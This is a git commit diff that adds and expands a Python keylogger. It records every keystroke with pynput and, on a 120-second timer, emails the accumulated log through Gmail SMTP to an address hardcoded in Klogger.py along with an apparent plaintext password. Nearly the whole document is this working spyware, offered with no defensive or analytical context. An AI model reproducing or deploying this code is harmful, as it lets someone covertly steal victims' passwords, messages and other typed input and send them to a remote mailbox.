5ad8cf81e33819c9ae0ed72056fcb00ac042147d
mattop64 <m.watts8311@gmail.com>
2021-03-23 15:32:19 -0400

    Keylogger updates

---
+++ Klogger.py
@@ -0,0 +1,6 @@
+#!/usr/bin/env python
+
+import keylogger
+
+my_keylogger = keylogger.Keylogger(120, "datasource226@gmail.com", "MGDZS@ejtMVywFf5VDoUvjJ75M@&!t%bn")
+my_keylogger.start()
--- keylogger.py
+++ keylogger.py
@@ -1,16 +1,43 @@
 #!/usr/bin/env Python
 
-import pynput.keyboard
+import pynput.keyboard, threading
+import smtplib
 
-def process_key_press(key):
-    print(key)
+class Keylogger:
+    def __init__(self, time_interval, email, password):
+        self.log = "Keylogger Started"
+        self.interval = time_interval
+        self.email = email
+        self.password = password
 
-keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
+    def append_to_log(self, string):
+        self.log = self.log + string
 
-with keyboard_listener:
-    keyboard_listener.join()
+    def process_key_press(self, key):
+        try:
+            current_key = str(key.char)
+        except AttributeError:
+            if key == key.space:
+                current_key = " "
+            else:
+                current_key = " " + str(key) + " "
+        self.append_to_log(current_key)
 
+    def report(self):
+        self.send_mail(self.email, self.password, "\n\n" + self.log)
+        self.log = ""
+        timer = threading.Timer(self.interval, self.report)
+        timer.start()
 
+    def send_mail(self, email, password, message):
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, message)
+        server.quit()
 
-
-
+    def start(self):
+        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
+        with keyboard_listener:
+            self.report()
+            keyboard_listener.join()
